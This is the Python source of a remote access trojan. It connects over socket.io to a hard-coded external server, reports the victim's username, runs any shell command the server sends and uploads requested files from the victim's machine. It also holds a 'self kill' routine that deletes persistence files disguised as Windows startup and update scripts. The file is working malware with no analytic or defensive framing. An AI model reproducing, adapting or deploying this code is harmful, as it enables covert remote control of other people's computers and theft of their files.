import importlib
import subprocess
import os
try: __import__('socketio')
except: subprocess.check_call(['pip', 'install', 'python-socketio', 'websocket-client','requests'])
import socketio
import requests

sio = socketio.Client()
on = 'http://raveneye.glitch.me/'
off = 'http://localhost:3000/'
url = on
upload_url = url+"upload"

class Session:
    def __init__(self):
        self.current_directory = os.getcwd()
        self.exit_requested = False

session = Session()

@sio.on('connect')
def on_connect():
    global session
    whoami_output = execute_command('whoami')
    sio.emit('intro', whoami_output[:-1])

@sio.on('message')
def on_message(msg):
    global session

    if msg.lower() == 'exit':
        os.system("taskkill /F /IM cmd.exe")
        session.exit_requested = True
        sio.disconnect()
        return
    if msg.lower() == 'self kill':
        startup = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        file_path = os.path.join(startup, "windows.vbs")
        os.remove(file_path) if os.path.exists(file_path) else None
        os.remove("C:/Updates/starter.bat") if os.path.exists("C:/Updates/starter.bat") else None
        os.remove("C:/Updates/main.py") if os.path.exists("C:/Updates/main.py") else None
        session.exit_requested = True
        sio.disconnect()
        return

    if msg.startswith('cd '):
        try:
            os.chdir(msg[3:].strip())
            session.current_directory = os.getcwd()
            sio.emit('message', f"Changed directory to: {session.current_directory}")
        except Exception as e:
            sio.emit('message', f"Error changing directory: {str(e)}")
    elif msg.startswith('download '):
        send_file(session.current_directory + '/' + msg[9:])
    else:
        output = execute_command(msg)
        sio.emit('message', output)

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=session.current_directory)
        return result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
    except Exception as e:
        return f"Error: {str(e)}"


def send_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            requests.post(upload_url, files={'file': file}, headers={})
    except:
            pass


sio.connect(url)

try:
    while not session.exit_requested:
        pass
except KeyboardInterrupt:
    pass
finally:
    sio.disconnect()
